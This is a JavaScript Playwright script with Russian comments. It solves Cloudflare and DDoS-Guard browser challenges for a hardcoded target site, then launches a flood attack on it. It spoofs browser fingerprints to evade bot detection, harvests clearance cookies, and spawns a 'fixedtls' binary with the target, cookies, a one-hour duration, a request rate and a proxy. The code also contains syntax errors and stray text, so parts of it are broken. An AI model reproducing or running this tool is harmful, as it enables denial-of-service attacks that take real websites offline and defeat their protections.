const playwright = require('playwright');
const colors = require('colors');
const { spawn } = require('child_process');
require('events').EventEmitter.defaultMaxListeners = Infinity;

const args = {
  Target: "https://legalizer.cc",
  Time: "3600",
  Method: "TLSv1",
  Rate: "299",
  Threads: "1"
};
const JSList = {
  js: [
    {
      name: "CloudFlare (Secure JS)",
      navigations: 2,
      locate: '<h2 class="h2" id="challenge-running">'
    },
    {
      name: "CloudFlare (Normal JS)",// не рабоьает sf в разработке . можеие сами там в html найти бокс кнопки и сделть нажатие. если не забуду скину черкз время.
      navigations: 2,
      locate: '<div class="cf-browser-verification cf-im-under-attack">'
    },
    {
      name: "DDoS-Guard",
      navigations: 1,
      locate: 'document.getElementById("title").innerHTML="Проверка браузера перед переходом на сайт "+host;'
    },
    {
      name: "DDoS-Guard-en",
      navigations: 2,
      locate: 'document.getElementById("description").innerHTML="This process is automatic. Your browser will redirect to your requested content shortly.<br>Please allow up to 5 seconds...";' // найдите на странице что написанно и возьмите html код. Если будут фиксить 
    }
  ]
};

const ignoreNames = [
  "RequestError", "StatusCodeError", "CaptchaError",
  "CloudflareError", "ParseError", "ParserError",
  "TimeoutError", "DeprecationWarning"
];

const ignoreCodes = [
  "ECONNRESET", "ERR_ASSERTION", "ECONNREFUSED",
  "EPIPE", "EHOSTUNREACH", "ETIMEDOUT",
  "ESOCKETTIMEDOUT", "EPROTO", "DEP0123",
  "ERR_SSL_WRONG_VERSION_NUMBER", "NS_ERROR_CONNECTION_REFUSED"
];


process.on("uncaughtException", handleError);
process.on("unhandledRejection", handleError);
process.on("warning", handleError);
process.on("SIGHUP", () => 1);
process.on("SIGCHILD", () => 1);

function handleError(e) {
  if ((e.code && ignoreCodes.includes(e.code)) || (e.name && ignoreNames.includes(e.name))) return;
  console.warn(e);
}

// 
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));


function log(msg) {
  const now = new Date();
  const time = now.toTimeString().split(' ')[0];
  console.log(`(${time}) - ${msg}`);
}

// 
const randomIntFromInterval = (min, max) =>
  Math.floor(Math.random() * (max - min + 1) + min);


function cookiesToStr(cookies) {
  return cookies.map(({ name, value }) => `${name}=${value}`).join(";");
}

function JSDetection(html) {
  return JSList.js.find(({ locate }) => html.includes(locate));
}

// браузер
async function solverInstance(args) {
 log(`(${`PlayWright`.cyan}) Запуск браузера.`);

const browser = await playwright.chromium.launch({
  headless: true,
  proxy: {
    server: `http://${args.Proxy}`
  },
  args: [
    '--no-sandbox',
    '--disable-setuid-sandbox',
    '--disable-dev-shm-usage',
    '--disable-gpu',
    '--disable-blink-features=AutomationControlled'
  ]
});

// 🎲 Рандомный профиль: десктоп или iPhone
function getRandomUAConfig() {
  const configs = [
    {
      name: 'Windows Chrome',
      userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
      viewport: { width: 1920, height: 1080 },
      deviceScaleFactor: 1,
      isMobile: false,
      hasTouch: false
    },
    {
      name: 'iPhone Safari',
      userAgent: 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
      viewport: { width: 390, height: 844 },
      deviceScaleFactor: 3,
      isMobile: true,
      hasTouch: true
    }
  ];
  return configs[Math.floor(Math.random() * configs.length)];
}

const uaConfig = getRandomUAConfig();
log(`(${`UA`.cyan}) Используется профиль: ${uaConfig.name.green}`);

const context = await browser.newContext({
  userAgent: uaConfig.userAgent,
  viewport: uaConfig.viewport,
  deviceScaleFactor: uaConfig.deviceScaleFactor,
  isMobile: uaConfig.isMobile,
  hasTouch: uaConfig.hasTouch
  javaScriptEnabled: true
});

const page = await context.newPage();


await page.addInitScript(() => {
  Object.defineProperty(navigator, 'webdriver', { get: () => false });

  window.chrome = { runtime: {} };

  Object.defineProperty(navigator, 'languages', {
    get: () => ['en-US', 'en']
  }); из

  Object.defineProperty(navigator, 'plugins', {
    get: () => [1, 2, 3, 4, 5]
  });

  const getParameter = WebGLRenderingContext.prototype.getParameter;
  WebGLRenderingContext.prototype.getParameter = function (parameter) {
    if (parameter === 37445) return 'Intel Inc.';
    if (parameter === 37446) return 'Intel Iris OpenGL Engine';
    return getParameter(parameter);
  };

  const originalQuery = window.navigator.permissions.query;
  window.navigator.permissions.query = (parameters) => (
    parameters.name === 'notifications'
      ? Promise.resolve({ state: Notification.permission })
      : originalQuery(parameters)
  );
});

try {
  await page.goto(args.Target, { waitUntil: 'domcontentloaded' });
} catch (e) {
  await browser.close();
  throw e;
}

log(`(${`PlayWright`.cyan}) UA: ${uaConfig.userAgent.green}`);
const ua = uaConfig.userAgent
  // Первая проверка
  await processProtection(page, 'JSDetect [1/2]');

  //  Повторная проверка 
  await processProtection(page, 'JSDetect [2/2]');

  const cookies = cookiesToStr(await page.context().cookies());
  const title = await page.title();

  log(`(${`Harvester`.green}) Заголовок: ${title}`);
  log(`(${`Harvester`.green}) Cookies: ${cookies.yellow}`);

// Запуск атаки, самописный tls можно лучше, через неделю скину нормальный.


// Обработка защиты
async function processProtection(page, label) {
  const html = await page.content();
  const title = await page.title();

  if (title === "Access denied") {
    log(`(${label.red}) Доступ к странице запрещён.`);
    return;
  }

  const detected = JSDetection(html);
  if (detected) {
    log(`(${label.green}) защита: ${detected.name.yellow}`);

    if (["DDoS-Guard", "DDoS-Guard-en"].includes(detected.name)) {
      for (let i = 0; i < 5; i++) {
        await page.mouse.move(randomIntFromInterval(0, 100), randomIntFromInterval(0, 100));
      }
      await page.mouse.down();
      await page.mouse.move(100, 100);
      await page.mouse.up();
      await sleep(20630)
      await page.reload({ waitUntil: 'domcontentloaded' });
    }

    for (let i = 0; i < detected.navigations; i++) {
      await page.waitForNavigation();
      log(`(${`Навигация`.green}) [${i + 1}/${detected.navigations}]`);
    }
  } else {
    log(`(${label}) Девки нас не ждут заходим`);
  }
}

  for (let i = 0; i < args.Threads; i++) {
    const cookies = cookiesToStr(await page.context().cookies());
    spawn('./fixedtls', [args.Target, ua, args.Time, cookies, args.Method, args.Rate, args.Proxy]);
  }
  
  log(`(${`PlayWright`.green}) Сессия заурыта.`);
  await browser.close();
  return cookies;
}

module.exports = {
  solverInstance
};